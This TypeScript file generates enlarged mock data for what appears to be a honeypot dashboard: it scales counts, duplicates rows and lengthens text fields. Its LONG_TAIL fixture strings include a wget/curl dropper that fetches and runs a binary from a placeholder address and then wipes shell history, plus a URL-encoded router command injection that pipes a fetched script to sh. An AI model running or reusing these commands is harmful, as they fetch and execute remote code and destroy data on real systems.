// The "large volumes" scenario: the same data at the scale of a busy
// deployment, so every page can be seen with six-digit counts, long lists
// and long values. It reshapes what a read returns rather than generating
// more data: counts are scaled, short lists grow with copies of their rows,
// and some free-text values get long.
//
// A copy keeps its row's content under a new id (`<id>~<n>`); lookups strip
// the suffix, so every copy opens its original's detail page.

/** Counts, never measures: scaling a port, score or percentage breaks it. */
const COUNT_KEYS = new Set([
  'events', 'sessions', 'count', 'total', 'sources', 'uniqueIps', 'uniqueSources', 'tunnelConnections', 'totalMatches',
  'logins', 'total24h', 'eventsLast24h', 'eventCount', 'downloads', 'docCount', 'documents', 'indexedDocuments',
  'detections', 'attempts', 'alerts', 'commands', 'calls', 'packets', 'deadLetters', 'failed24h', 'creds', 'payloads',
  'ips', 'fingerprints', 'sizeBytes', 'bytes', 'storeBytes', 'trend',
])

/** Sets whose every number is a count (the overview's KPI tiles). */
const ALL_COUNTS = new Set(['kpis'])

/** Fixed sets: the same size however busy the deployment is. */
const FIXED = new Set(['kpis', 'templates', 'elements', 'types', 'analyzers', 'recipes', 'sections', 'tabs', 'steps'])

const FACTOR = 137
const GROW_TO = 240

/** Long free text, one per kind of field; long unbroken tokens included. */
const LONG_TAIL: Record<string, string> = {
  command: '; cd /tmp || cd /var/run || cd /dev/shm; wget -q http://203.0.113.50/bins/x86_64 -O .x || curl -fsSL http://203.0.113.50/bins/x86_64 -o .x; chmod 777 .x && ./.x ssh.persist; history -c; rm -rf ~/.bash_history',
  message: ' /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3Ewget%20http%3A%2F%2F203.0.113.50%2Fx.sh%20-O-%7Csh)%3B%24(rm%20-rf%20%2Ftmp%2F*)',
  detail: ' /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3Ewget%20http%3A%2F%2F203.0.113.50%2Fx.sh%20-O-%7Csh)%3B%24(rm%20-rf%20%2Ftmp%2F*)',
}
const PROSE_TAIL = ', seen again across 214 sensors in 38 countries over the last seven days, with 1,204 distinct source addresses, a peak of 9,812 events in a single hour, and the same toolchain fingerprint on every one of them'
const PROSE_KEYS = new Set(['summary', 'title', 'reason', 'subject', 'explanation', 'description', 'memo', 'error'])

/** A stable third of the values get long, so long and short sit together. */
const picked = (value: string) => value.length % 3 === 0

function lengthen(key: string, value: string): string {
  if (!picked(value)) return value
  if (key in LONG_TAIL) return value + LONG_TAIL[key]
  if (PROSE_KEYS.has(key)) return value + PROSE_TAIL
  return value
}

/** Ids a route validates by shape (addresses, hashes) cannot take a suffix. */
const copyableId = (id: unknown): id is string => typeof id === 'string' && /^[\w-]+$/.test(id) && !/^[0-9a-f]{32,}$/i.test(id)

function grow(items: unknown[]): unknown[] {
  if (items.length < 2 || items.length >= GROW_TO) return items
  if (!items.every((item) => item !== null && typeof item === 'object' && copyableId((item as { id?: unknown }).id))) return items
  const target = Math.min(items.length * 25, GROW_TO)
  const out = [...items]
  for (let n = 1; out.length < target; n++) {
    for (const item of items) {
      if (out.length >= target) break
      out.push({ ...(item as object), id: `${(item as { id: string }).id}~${n}` })
    }
  }
  return out
}

/** A read's result at the scale of a busy deployment. */
export function enlarged<T>(value: T, key = '', allCounts = false): T {
  if (Array.isArray(value)) {
    const items = FIXED.has(key) ? value : grow(value)
    return items.map((item) => enlarged(item, key, allCounts || ALL_COUNTS.has(key))) as T
  }
  if (typeof value === 'number') return (allCounts || COUNT_KEYS.has(key) ? Math.round(value * FACTOR) : value) as T
  if (typeof value === 'string') return lengthen(key, value) as T
  if (value === null || typeof value !== 'object') return value
  return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, enlarged(v, k, allCounts || ALL_COUNTS.has(k))])) as T
}

/** A lookup by a copy's id is a lookup by its original's. */
export const originalArgs = (args: unknown[]): unknown[] => args.map((arg) => (typeof arg === 'string' ? arg.replace(/~\d+$/, '') : arg))
